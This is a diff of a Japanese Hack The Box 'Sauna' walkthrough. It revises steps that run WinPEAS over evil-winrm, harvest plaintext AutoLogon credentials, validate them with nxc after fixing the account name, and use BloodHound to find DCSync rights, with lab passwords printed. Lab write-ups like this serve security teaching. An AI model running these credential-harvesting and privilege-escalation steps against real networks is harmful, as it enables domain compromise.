@@ -434,19 +434,23 @@ Foothold後の列挙は`WinPEAS`[^6] に任せる。
 意味: Windows向けの権限昇格経路列挙ツール。AutoLogon設定、資格情報マネージャ、スケジュールタスク、脆弱サービスなどを一通り舐めてくれる。
 :::
 
-攻撃用マシン側でHTTPサーバを立て、`evil-winrm`の`upload`コマンドで送り込んで実行する。
+`evil-winrm`の`upload`コマンドで送り込み、出力をファイルに吐かせたうえで、`download`コマンドで手元に回収して腰を据えて読む。
 
 ```sh
-*Evil-WinRM* PS C:\Users\FSmith\Documents> upload /opt/PEASS/winPEASx64.exe
+*Evil-WinRM* PS C:\Users\FSmith\Documents> upload winPEASx64.exe
 ...
-*Evil-WinRM* PS C:\Users\FSmith\Documents> .\winPEASx64.exe
-...
+*Evil-WinRM* PS C:\Users\FSmith\Documents> .\winPEASx64.exe > winpeas.txt
+*Evil-WinRM* PS C:\Users\FSmith\Documents> download winpeas.txt /home/kali/HTB/Sauna/winpeas.txt
+```
+
+ダウンロードした`winpeas.txt`を眺めていると、AutoLogon関連の記載が目に留まる。
+
+```:winpeas.txt(抜粋)
 [+] Looking for AutoLogon credentials(T1012)
     Some AutoLogon credentials were found!!
     DefaultDomainName    :    EGOTISTICALBANK
     DefaultUserName      :    EGOTISTICALBANK\svc_loanmanager
     DefaultPassword      :    Moneymakestheworldgoround!
-...
 ```
 
 > DefaultUserName  :  EGOTISTICALBANK\svc_loanmanager  
@@ -458,7 +462,18 @@ Foothold後の列挙は`WinPEAS`[^6] に任せる。
 Windowsを再起動したときに自動的にログオンするためのレジストリ設定(`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`)。有効化すると、ログオン対象のユーザ名/PWが平文でレジストリに格納されるため、ローカルシェルを取っていれば読まれてしまう。
 :::
 
-ただし、`WinPEAS`が吐いた`svc_loanmanager`はドメイン上の実際のアカウント名とは微妙に違う可能性がある(AutoLogonの表示用名称と実アカウント名が食い違うケース)。`C:\Users`配下を見ておく。
+まずは拾ったクレデンシャルがそのまま有効かを`nxc`で確認してみる。
+
+```sh
+┌──(root㉿5602a1b7889d)-[~/Sauna]
+└─# nxc ldap ${RHOSTS} -u svc_loanmanager -p 'Moneymakestheworldgoround!'
+LDAP        10.10.10.175    389    SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:None) (channel binding:No TLS cert)
+LDAP        10.10.10.175    389    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\svc_loanmanager:Moneymakestheworldgoround!
+```
+
+> [-] EGOTISTICAL-BANK.LOCAL\svc_loanmanager:Moneymakestheworldgoround!
+
+末尾が`[-]`で弾かれた。PWは拾えているはずなので、ユーザ名側がドメイン上の実アカウント名と食い違っているパターンを疑う(AutoLogonレジストリに書かれるのは表示用名称で、実際のsAMAccountNameとは別物になり得る)。`fsmith`のシェルから`C:\Users`配下を見て、実在するアカウント名を確認する。
 
 ```sh
 *Evil-WinRM* PS C:\Users\FSmith\Documents> dir C:\Users
@@ -473,7 +488,7 @@ d-r---          1/22/2020   9:32 AM                Public
 d-----          1/24/2020   4:05 PM                svc_loanmgr
 ```
 
-実在するアカウントは`svc_loanmgr`。`nxc`でクレデンシャルを噛み合わせてみる。
+やはり実在するのは`svc_loanmgr`(末尾が省略形)だった。改めて`nxc`で噛ませる。
 
 ```sh
 ┌──(root㉿5602a1b7889d)-[~/Sauna]
@@ -482,7 +497,7 @@ WINRM       10.10.10.175    5985   SAUNA            [*] Windows 10 / Server 2019
 WINRM       10.10.10.175    5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Moneymakestheworldgoround! (Pwn3d!)
 ```
 
-ビンゴ、こちらも`Pwn3d!`。クレデンシャルを更新。
+今度は`Pwn3d!`。クレデンシャルを更新。
 
 ```txt:creds.txt
 fsmith:Thestrokes23
@@ -537,7 +552,9 @@ INFO: Compressing output into 20261011211234_bloodhound.zip
 
 収集したzipをBloodHound GUI(`neo4j console` → `bloodhound`)にドラッグ&ドロップで食わせ、Analysisタブの`Find Principals with DCSync Rights`を叩く。
 
-結果、`SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL`→`EGOTISTICAL-BANK.LOCAL`に向かって`GetChangesAll`エッジが生えていた。
+結果、`SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL`→`EGOTISTICAL-BANK.LOCAL`に向かって`GetChanges` / `GetChangesAll`のエッジが生えていた。
+
+![BloodHoundでsvc_loanmgrからドメインに向かってGetChangesAllエッジが伸びている](/images/sauna-bloodhound-dcsync.png)
 
 ```
 SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL --(GetChangesAll)--> EGOTISTICAL-BANK.LOCAL
